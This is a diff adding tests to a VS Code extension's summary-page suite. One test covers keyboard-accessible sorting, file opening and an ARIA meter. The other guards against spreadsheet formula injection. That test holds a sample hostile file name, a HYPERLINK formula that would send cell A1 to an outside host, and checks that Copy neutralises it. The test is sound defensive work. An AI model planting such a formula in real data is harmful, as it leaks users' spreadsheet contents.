@@ -1,4 +1,5 @@
 import * as assert from 'assert';
+import * as vm from 'vm';
 
 import { renderSummary, type SummaryView } from '../../src/summary/render';
 import { contentSecurityPolicy, createNonce } from '../../src/html';
@@ -118,6 +119,25 @@ suite('summary page', () => {
         assert.deepStrictEqual(widths, [100, 25]);
     });
 
+    test('sorting, opening a file and the meter work from the keyboard', () => {
+        // Sorting and opening a file were click handlers on a <th> and on an
+        // <a> with no href, neither of which the keyboard can reach, and the
+        // meter was two bare boxes that announced nothing.
+        const html = render({ totalTokens: 2_500, contextLimit: 10_000 });
+
+        assert.ok(html.includes('<th aria-sort="none"><button type="button" data-sort="path">'), 'Path');
+        assert.ok(
+            html.includes('<th aria-sort="descending" class="num"><button type="button" data-sort="tokens">'),
+            'Tokens, the initial sort, largest first',
+        );
+        assert.ok(!/<th[^>]*data-sort/.test(html), 'a header cell is still the click target');
+
+        assert.ok(html.includes(`'<tr><td><button type="button" class="file-link"`), 'rows open files from a button');
+        assert.ok(!html.includes('<a class="file-link"'));
+
+        assert.ok(/role="meter"[^>]*aria-valuenow="25"/.test(html), 'the meter has no value for assistive technology');
+    });
+
     test('discloses files counted but not listed', () => {
         assert.ok(render({ filesNotListed: 1_500 }).includes('1,500'));
         assert.ok(!render({ filesNotListed: 0 }).includes('not listed'));
@@ -143,6 +163,28 @@ suite('summary page', () => {
             /TRUNCATION_NOTE = ""/.test(complete),
             'a complete list should embed an empty note',
         );
+    });
+
+    test("Copy cannot paste a file's name into a spreadsheet as a formula", () => {
+        // The page's own script, run with only the DOM it touches.
+        const name = '=HYPERLINK("https://example.com/?"&A1)';
+        const html = render({ files: [{ path: `/repo/${name}`, display: name, tokens: 9 }] });
+        const script = /<script nonce="[^"]+">([\s\S]*)<\/script>/.exec(html)?.[1];
+        assert.ok(script);
+        const handlers: Record<string, () => void> = {};
+        const element = (id: string) => ({
+            value: '',
+            hidden: false,
+            innerHTML: '',
+            addEventListener: (_type: string, fn: () => void) => (handlers[id] = fn),
+        });
+        const posted: { command: string; text?: string }[] = [];
+        vm.runInNewContext(script, {
+            acquireVsCodeApi: () => ({ postMessage: (m: { command: string; text?: string }) => posted.push(m) }),
+            document: { getElementById: element, querySelectorAll: () => [] },
+        });
+        handlers.copy();
+        assert.strictEqual(posted.at(-1)?.text, `'${name}\t9`);
     });
 
     test('escapes workspace-controlled text everywhere it appears', () => {
